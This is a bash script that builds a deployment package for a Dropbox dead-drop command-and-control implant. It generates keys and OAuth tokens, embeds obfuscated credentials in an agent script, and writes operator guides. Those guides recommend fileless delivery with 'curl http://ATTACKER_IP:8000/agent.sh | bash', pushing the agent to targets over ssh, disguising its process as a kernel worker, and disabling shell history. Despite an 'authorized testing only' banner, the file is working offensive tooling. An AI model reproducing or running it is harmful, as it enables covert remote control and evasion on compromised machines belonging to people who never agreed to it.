#!/bin/bash

################################################################################
# SCRIPT: deployer.sh
# DESCRIPTION: Automated deployment package generator for Dropbox C2
#
# WORKFLOW:
# 1. VERIFY TEMPLATES
# 2. GENERATE RSA KEYS
# 3. SETUP DROPBOX OAUTH2
# 4. CONFIGURE PATHS AND TIMING
# 5. GENERATE CONTROLLER SCRIPTS
# 6. GENERATE AGENT WITH EMBEDDED CREDENTIALS
# 7. CREATE DEPLOYMENT PACKAGE
################################################################################

set -e

# Colors
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
CYAN='\033[0;36m'
NC='\033[0m'

# === BANNER ===
clear
echo -e "${CYAN}"
cat << "EOF"
  ____  ____   ___  ____  ____   _____  __  __   ____   
 |  _ \|  _ \ / _ \|  _ \| __ ) / _ \ \/ / / ___|___ \ 
 | | | | |_) | | | | |_) |  _ \| | | \  / | |     __) |
 | |_| |  _ <| |_| |  __/| |_) | |_| /  \ | |___ / __/ 
 |____/|_| \_\\___/|_|   |____/ \___/_/\_\ \____|_____|

      Dead-Drop C2 Deployment Generator v2.3
      
EOF
echo -e "${NC}"
echo -e "${YELLOW}⚠️  Educational & Authorized Testing Only${NC}"
echo -e "${RED}❌ Unauthorized use is illegal - Use responsibly${NC}"
echo -e "${BLUE}🔗 github.com/daniomass/dropbox-dead-drop-cloud-c2.git${NC}"
echo ""
echo "────────────────────────────────────────────────────────"
echo ""

# === CHECK TEMPLATE FILES ===
echo -e "${YELLOW}[CHECK]: Verifying template files...${NC}"

REQUIRED_TEMPLATES=(
    "writer_template.sh"
    "reader_template.sh"
    "agent_template.sh"
)

for file in "${REQUIRED_TEMPLATES[@]}"; do
    if [ ! -f "$file" ]; then
        echo -e "${RED}[ERROR]: Missing template: $file${NC}"
        echo "Make sure you have all templates in current directory"
        exit 1
    fi
done

echo -e "${GREEN}[OK]: All templates found${NC}"

# === CHECK PREREQUISITES ===
echo -e "${YELLOW}[CHECK]: Verifying required tools...${NC}"
for cmd in openssl curl base64 awk sed; do
    if ! command -v $cmd >/dev/null 2>&1; then
        echo -e "${RED}[ERROR]: $cmd not found${NC}"
        exit 1
    fi
done
echo -e "${GREEN}[OK]: Tools verified${NC}"

# === CREATE DEPLOYMENT FOLDERS ===
DEPLOY_DIR="deployment_$(date +%Y%m%d_%H%M%S)"
CONTROLLER_DIR="$DEPLOY_DIR/controller"
AGENT_DIR="$DEPLOY_DIR/agent"

mkdir -p "$CONTROLLER_DIR" "$AGENT_DIR"
echo -e "${GREEN}[OK]: Deployment folder: $DEPLOY_DIR${NC}"

# === STEP 1: GENERATE RSA KEYS ===
echo ""
echo -e "${CYAN}=== STEP 1/5: RSA Key Generation ===${NC}"

if [ -f "private_key.pem" ] && [ -f "public_key.pem" ]; then
    echo -e "${YELLOW}[WARNING]: Found existing RSA keys${NC}"
    read -p "Reuse existing keys? (y/n): " reuse_keys
    if [ "$reuse_keys" = "y" ]; then
        cp private_key.pem "$CONTROLLER_DIR/"
        cp public_key.pem "$CONTROLLER_DIR/"
        echo -e "${GREEN}[OK]: RSA keys copied${NC}"
    else
        echo "[KEYGEN]: Generating new RSA 4096-bit keys..."
        openssl genrsa -out "$CONTROLLER_DIR/private_key.pem" 4096 2>/dev/null
        openssl rsa -in "$CONTROLLER_DIR/private_key.pem" -pubout -out "$CONTROLLER_DIR/public_key.pem" 2>/dev/null
        chmod 600 "$CONTROLLER_DIR/private_key.pem"
        chmod 644 "$CONTROLLER_DIR/public_key.pem"
        echo -e "${GREEN}[OK]: New RSA keys generated${NC}"
    fi
else
    echo "[KEYGEN]: Generating RSA 4096-bit keys (may take 30 seconds)..."
    openssl genrsa -out "$CONTROLLER_DIR/private_key.pem" 4096 2>/dev/null
    openssl rsa -in "$CONTROLLER_DIR/private_key.pem" -pubout -out "$CONTROLLER_DIR/public_key.pem" 2>/dev/null
    chmod 600 "$CONTROLLER_DIR/private_key.pem"
    chmod 644 "$CONTROLLER_DIR/public_key.pem"
    echo -e "${GREEN}[OK]: RSA keys generated${NC}"
fi

# === STEP 2: DROPBOX OAUTH2 ===
echo ""
echo -e "${CYAN}=== STEP 2/5: Dropbox OAuth2 Configuration ===${NC}"

if [ -f ".dropbox_refresh_token" ]; then
    echo -e "${YELLOW}[WARNING]: Found existing .dropbox_refresh_token${NC}"
    read -p "Reuse existing configuration? (y/n): " reuse_config
    if [ "$reuse_config" = "y" ]; then
        cp .dropbox_refresh_token "$CONTROLLER_DIR/"
        source .dropbox_refresh_token
        echo -e "${GREEN}[OK]: OAuth2 configuration copied${NC}"
    else
        echo "New configuration requested..."
        reuse_config="n"
    fi
else
    reuse_config="n"
fi

if [ "$reuse_config" = "n" ]; then
    echo ""
    echo "You need to create a Dropbox App to obtain:"
    echo "1. APP_KEY"
    echo "2. APP_SECRET"
    echo "3. AUTHORIZATION CODE (from browser)"
    echo ""
    
    read -p "Do you already have a Dropbox App? (y/n): " has_app
    
    if [ "$has_app" != "y" ]; then
        echo ""
        echo -e "${YELLOW}=== DROPBOX APP CREATION GUIDE ===${NC}"
        echo "1. https://www.dropbox.com/developers/apps/create"
        echo "2. Scoped access → Full Dropbox"
        echo "3. Name: C2_System_$(date +%Y%m%d)"
        echo "4. Permissions → files.content.read, files.content.write"
        echo ""
        read -p "Press ENTER when ready..."
    fi
    
    echo ""
    read -p "APP_KEY: " APP_KEY
    read -p "APP_SECRET: " APP_SECRET
    
    echo ""
    echo -e "${YELLOW}Open this URL:${NC}"
    echo ""
    echo -e "${GREEN}https://www.dropbox.com/oauth2/authorize?response_type=code&client_id=$APP_KEY&token_access_type=offline${NC}"
    echo ""
    read -p "AUTHORIZATION CODE: " AUTH_CODE
    
    echo "[OAUTH]: Requesting refresh token..."
    
    response=$(curl -s -X POST https://api.dropboxapi.com/oauth2/token \
        -d code=$AUTH_CODE \
        -d grant_type=authorization_code \
        -d client_id=$APP_KEY \
        -d client_secret=$APP_SECRET)
    
    REFRESH_TOKEN=$(echo "$response" | grep -oP '"refresh_token"\s*:\s*"\K[^"]+' 2>/dev/null)
    if [ -z "$REFRESH_TOKEN" ]; then
        REFRESH_TOKEN=$(echo "$response" | sed -n 's/.*"refresh_token":"\([^"]*\)".*/\1/p')
    fi
    
    if [ -z "$REFRESH_TOKEN" ]; then
        echo -e "${RED}[ERROR]: Unable to obtain refresh token${NC}"
        echo "Response: $response"
        exit 1
    fi
    
    echo -e "${GREEN}[OK]: Refresh token obtained (${#REFRESH_TOKEN} characters)${NC}"
    
    # Save config
    cat > "$CONTROLLER_DIR/.dropbox_refresh_token" << EOF
# Dropbox OAuth2 Configuration
# Generated: $(date)

APP_KEY="$APP_KEY"
APP_SECRET="$APP_SECRET"
REFRESH_TOKEN="$REFRESH_TOKEN"
EOF
    
    chmod 600 "$CONTROLLER_DIR/.dropbox_refresh_token"
fi

# === STEP 3: CONFIGURE PATHS AND TIMING ===
echo ""
echo -e "${CYAN}=== STEP 3/5: Dropbox Path and Timing Configuration ===${NC}"

echo ""
echo -e "${YELLOW}Dropbox Paths:${NC}"
read -p "Folder path [default: /Machine1]: " input_folder
FOLDER_PATH=${input_folder:-/Machine1}

read -p "Input file [default: /input.txt]: " input_file
INPUT_FILE=${input_file:-/input.txt}

read -p "Output file [default: /output.txt]: " output_file
OUTPUT_FILE=${output_file:-/output.txt}

read -p "Heartbeat file [default: /heartbeat.txt]: " heartbeat_file
HEARTBEAT_FILE=${heartbeat_file:-/heartbeat.txt}

echo ""
echo -e "${YELLOW}Agent Timing:${NC}"
read -p "Base sleep (seconds) [default: 30]: " input_sleep
BASE_SLEEP=${input_sleep:-30}

read -p "Jitter percent [default: 30]: " input_jitter
JITTER_PERCENT=${input_jitter:-30}

echo ""
echo -e "${GREEN}[CONFIG]: Configuration saved:${NC}"
echo "  Folder: $FOLDER_PATH"
echo "  Input: $INPUT_FILE"
echo "  Output: $OUTPUT_FILE"
echo "  Heartbeat: $HEARTBEAT_FILE"
echo "  Sleep: ${BASE_SLEEP}s, Jitter: ${JITTER_PERCENT}%"

# === STEP 4: COPY & MODIFY CONTROLLER SCRIPTS ===
echo ""
echo -e "${CYAN}=== STEP 4/5: Controller Scripts Generation ===${NC}"

# Copy writer
cp writer_template.sh "$CONTROLLER_DIR/writer.sh"
sed -i "s|INPUT_PATH=\"/Machine1/input.txt\"|INPUT_PATH=\"${FOLDER_PATH}${INPUT_FILE}\"|g" "$CONTROLLER_DIR/writer.sh"
chmod +x "$CONTROLLER_DIR/writer.sh"
echo -e "${GREEN}[OK]: writer.sh → controller/ (path: ${FOLDER_PATH}${INPUT_FILE})${NC}"

# Copy reader
cp reader_template.sh "$CONTROLLER_DIR/reader.sh"
sed -i "s|OUTPUT_PATH=\"/Machine1/output.txt\"|OUTPUT_PATH=\"${FOLDER_PATH}${OUTPUT_FILE}\"|g" "$CONTROLLER_DIR/reader.sh"
chmod +x "$CONTROLLER_DIR/reader.sh"
echo -e "${GREEN}[OK]: reader.sh → controller/ (path: ${FOLDER_PATH}${OUTPUT_FILE})${NC}"

# === STEP 5: GENERATE AGENT WITH EMBEDDED CREDENTIALS ===
echo ""
echo -e "${CYAN}=== STEP 5/5: Agent Generation with Embedded Credentials ===${NC}"

PUBLIC_KEY_CONTENT=$(cat "$CONTROLLER_DIR/public_key.pem")
APP_KEY_B64=$(echo -n "$APP_KEY" | base64 -w 0)
APP_SECRET_B64=$(echo -n "$APP_SECRET" | base64 -w 0)
REFRESH_TOKEN_B64=$(echo -n "$REFRESH_TOKEN" | base64 -w 0)

PUBLIC_KEY_B64=$(echo "$PUBLIC_KEY_CONTENT" | base64 -w 0)
PK_LEN=${#PUBLIC_KEY_B64}
CHUNK=$((PK_LEN / 4))
PK1=$(echo "$PUBLIC_KEY_B64" | cut -c1-$CHUNK)
PK2=$(echo "$PUBLIC_KEY_B64" | cut -c$((CHUNK+1))-$((CHUNK*2)))
PK3=$(echo "$PUBLIC_KEY_B64" | cut -c$((CHUNK*2+1))-$((CHUNK*3)))
PK4=$(echo "$PUBLIC_KEY_B64" | cut -c$((CHUNK*3+1))-)

cp agent_template.sh "$AGENT_DIR/agent.sh"

sed -i "s|PLACEHOLDER_APP_KEY_B64|$APP_KEY_B64|g" "$AGENT_DIR/agent.sh"
sed -i "s|PLACEHOLDER_APP_SECRET_B64|$APP_SECRET_B64|g" "$AGENT_DIR/agent.sh"
sed -i "s|PLACEHOLDER_REFRESH_TOKEN_B64|$REFRESH_TOKEN_B64|g" "$AGENT_DIR/agent.sh"
sed -i "s|PLACEHOLDER_PK1|$PK1|g" "$AGENT_DIR/agent.sh"
sed -i "s|PLACEHOLDER_PK2|$PK2|g" "$AGENT_DIR/agent.sh"
sed -i "s|PLACEHOLDER_PK3|$PK3|g" "$AGENT_DIR/agent.sh"
sed -i "s|PLACEHOLDER_PK4|$PK4|g" "$AGENT_DIR/agent.sh"

sed -i "s|FOLDER_PATH=\"/Machine1\"|FOLDER_PATH=\"${FOLDER_PATH}\"|g" "$AGENT_DIR/agent.sh"
sed -i "s|INPUT_FILE=\"/input.txt\"|INPUT_FILE=\"${INPUT_FILE}\"|g" "$AGENT_DIR/agent.sh"
sed -i "s|OUTPUT_FILE=\"/output.txt\"|OUTPUT_FILE=\"${OUTPUT_FILE}\"|g" "$AGENT_DIR/agent.sh"
sed -i "s|HEARTBEAT_FILE=\"/heartbeat.txt\"|HEARTBEAT_FILE=\"${HEARTBEAT_FILE}\"|g" "$AGENT_DIR/agent.sh"

sed -i "s|BASE_SLEEP=PLACEHOLDER_BASE_SLEEP|BASE_SLEEP=${BASE_SLEEP}|g" "$AGENT_DIR/agent.sh"
sed -i "s|JITTER_PERCENT=PLACEHOLDER_JITTER_PERCENT|JITTER_PERCENT=${JITTER_PERCENT}|g" "$AGENT_DIR/agent.sh"

chmod +x "$AGENT_DIR/agent.sh"

echo -e "${GREEN}[OK]: agent.sh → agent/ (embedded credentials)${NC}"

# === GENERATE DOCUMENTATION ===
echo ""
echo -e "${CYAN}=== Documentation Generation ===${NC}"

cat > "$CONTROLLER_DIR/README.txt" << EOF
=== CONTROLLER - QUICK GUIDE ===

FILES:
- private_key.pem          : RSA private key
- public_key.pem           : RSA public key
- .dropbox_refresh_token   : OAuth2 credentials
- writer.sh                : Send commands
- reader.sh                : Read output

CONFIGURATION:
- Folder: $FOLDER_PATH
- Input: $INPUT_FILE
- Output: $OUTPUT_FILE
- Heartbeat: $HEARTBEAT_FILE

USAGE:
  # Normal mode
  ./writer.sh whoami
  ./reader.sh
  
  # Quiet mode (no verbose output)
  ./writer.sh -q whoami
  ./reader.sh -q
  
  # Terminate agent
  ./writer.sh EXIT
EOF

cat > "$AGENT_DIR/README.txt" << EOF
=== AGENT - DEPLOYMENT ===

FILE: agent.sh

EMBEDDED CONFIGURATION:
- Folder: $FOLDER_PATH
- Input: $INPUT_FILE
- Output: $OUTPUT_FILE
- Heartbeat: $HEARTBEAT_FILE
- Sleep: ${BASE_SLEEP}s
- Jitter: ${JITTER_PERCENT}%

OPTIONS:
  -q    Quiet mode (no console output)
  -d    Daemon mode (complete detach from terminal)

DEPLOYMENT METHODS:
1. File: ./agent.sh
2. Quiet: ./agent.sh -q
3. Daemon: ./agent.sh -d
4. Daemon+Quiet: ./agent.sh -d -q
5. Fileless: curl http://IP/agent.sh | bash
6. Screen: screen -dmS c2 ./agent.sh

FEATURES:
- Credentials already embedded (no external config)
- Process masking: [kworker/u:0]
- Bash history disabled
- Ctrl+C works for kill

TERMINATION:
- Foreground: Ctrl+C
- Daemon: ./writer.sh EXIT
- Hard kill: pkill -f "kworker/u:0"
EOF

cat > "$DEPLOY_DIR/DEPLOYMENT_GUIDE.txt" << EOF
========================================
  DROPBOX C2 - DEPLOYMENT GUIDE
========================================
Generated: $(date)

CONFIGURATION:
- Dropbox folder: $FOLDER_PATH
- Input file: $INPUT_FILE
- Output file: $OUTPUT_FILE
- Heartbeat file: $HEARTBEAT_FILE
- Agent sleep: ${BASE_SLEEP}s (jitter: ${JITTER_PERCENT}%)

PREREQUISITES:
1. Create folder on Dropbox: $FOLDER_PATH
2. Create 3 files: 
   - ${FOLDER_PATH}${INPUT_FILE}
   - ${FOLDER_PATH}${OUTPUT_FILE}
   - ${FOLDER_PATH}${HEARTBEAT_FILE}
3. Write "MZ" in ${INPUT_FILE}

CONTROLLER:
  cd $CONTROLLER_DIR
  
  # Normal mode
  ./writer.sh whoami
  ./reader.sh
  
  # Quiet mode
  ./writer.sh -q whoami
  ./reader.sh -q

AGENT:
  # File on disk
  scp $AGENT_DIR/agent.sh user@target:/tmp/
  ssh user@target "bash /tmp/agent.sh"
  
  # Daemon mode
  ssh user@target "bash /tmp/agent.sh -d"
  
  # Quiet + Daemon
  ssh user@target "bash /tmp/agent.sh -d -q"

FILELESS (recommended):
  cd $AGENT_DIR
  python3 -m http.server 8000
  
  # On target:
  curl -s http://ATTACKER_IP:8000/agent.sh | bash
  
  # Daemon mode:
  curl -s http://ATTACKER_IP:8000/agent.sh | bash -s -- -d

SCREEN (reattachable):
  screen -dmS c2_agent bash /tmp/agent.sh
  screen -r c2_agent

TERMINATE:
  ./writer.sh EXIT
  # or
  pkill -f "kworker/u:0"
EOF

# === SUMMARY ===
echo ""
echo -e "${GREEN}╔═══════════════════════════════════════════════════════════════╗${NC}"
echo -e "${GREEN}║              DEPLOYMENT PACKAGE GENERATED!                    ║${NC}"
echo -e "${GREEN}╚═══════════════════════════════════════════════════════════════╝${NC}"
echo ""
echo -e "${CYAN}Structure:${NC}"
echo "$DEPLOY_DIR/"
echo "├── controller/"
echo "│   ├── private_key.pem"
echo "│   ├── public_key.pem"
echo "│   ├── .dropbox_refresh_token"
echo "│   ├── writer.sh"
echo "│   ├── reader.sh"
echo "│   └── README.txt"
echo "├── agent/"
echo "│   ├── agent.sh (embedded credentials)"
echo "│   └── README.txt"
echo "└── DEPLOYMENT_GUIDE.txt"
echo ""
echo -e "${YELLOW}Configuration:${NC}"
echo "  Folder: $FOLDER_PATH"
echo "  Input: $INPUT_FILE"
echo "  Output: $OUTPUT_FILE"
echo "  Heartbeat: $HEARTBEAT_FILE"
echo "  Sleep: ${BASE_SLEEP}s, Jitter: ${JITTER_PERCENT}%"
echo ""
echo -e "${YELLOW}Next steps:${NC}"
echo "1. Create $FOLDER_PATH on Dropbox with 3 files"
echo "2. Write \"MZ\" in ${FOLDER_PATH}${INPUT_FILE}"
echo "3. cd $CONTROLLER_DIR && ./writer.sh whoami"
echo "4. Deploy agent (see DEPLOYMENT_GUIDE.txt)"
echo ""
echo -e "${CYAN}Available modes:${NC}"
echo "  ./writer.sh -q \"command\"    # quiet"
echo "  ./reader.sh -q               # quiet"
echo "  ./agent.sh -d                # daemon"
echo "  ./agent.sh -d -q             # daemon + quiet"
echo ""
echo -e "${GREEN}[DONE]${NC}"
